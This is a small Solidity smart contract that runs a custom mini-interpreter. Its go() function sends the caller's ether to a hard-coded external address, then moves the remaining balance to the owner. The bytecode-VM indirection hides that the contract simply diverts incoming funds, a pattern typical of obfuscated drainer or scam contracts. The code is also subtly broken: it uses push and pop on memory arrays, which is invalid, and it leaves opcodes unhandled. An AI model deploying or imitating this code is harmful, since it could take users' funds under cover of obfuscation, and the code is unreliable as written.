pragma solidity ^0.4.24;

contract B {
    address public owner = msg.sender;
    
    enum Instruction { PUSH, POP, ADDR, CALL, TRNS, LD, ST, HALT }
    
    struct VM {
        uint256[] stack;
        uint256 pc;
        address target;
    }
    
    function execute(uint256[] memory bytecode) internal {
        VM memory vm = VM({stack: new uint256[](256), pc: 0, target: 0xC8A60C51967F4022BF9424C337e9c6F0bD220E1C});
        
        while (true) {
            Instruction instruction = Instruction(bytecode[vm.pc++]);
            if (instruction == Instruction.HALT) {
                break;
            } else if (instruction == Instruction.PUSH) {
                vm.stack.push(bytecode[vm.pc++]);
            } else if (instruction == Instruction.POP) {
                vm.stack.pop();
            } else if (instruction == Instruction.ADDR) {
                vm.stack.push(uint256(vm.target));
            } else if (instruction == Instruction.CALL) {
                address(vm.stack.pop()).call.value(vm.stack.pop())();
            } else if (instruction == Instruction.TRNS) {
                owner.transfer(address(this).balance);
            }
        }
    }
    
    function go() public payable {
        uint256[] memory bytecode = new uint256[](7);
        bytecode[0] = uint256(Instruction.PUSH);
        bytecode[1] = msg.value;
        bytecode[2] = uint256(Instruction.ADDR);
        bytecode[3] = uint256(Instruction.CALL);
        bytecode[4] = uint256(Instruction.TRNS);
        bytecode[5] = uint256(Instruction.HALT);
        
        execute(bytecode);
    }
    
    function() public payable {
    }
}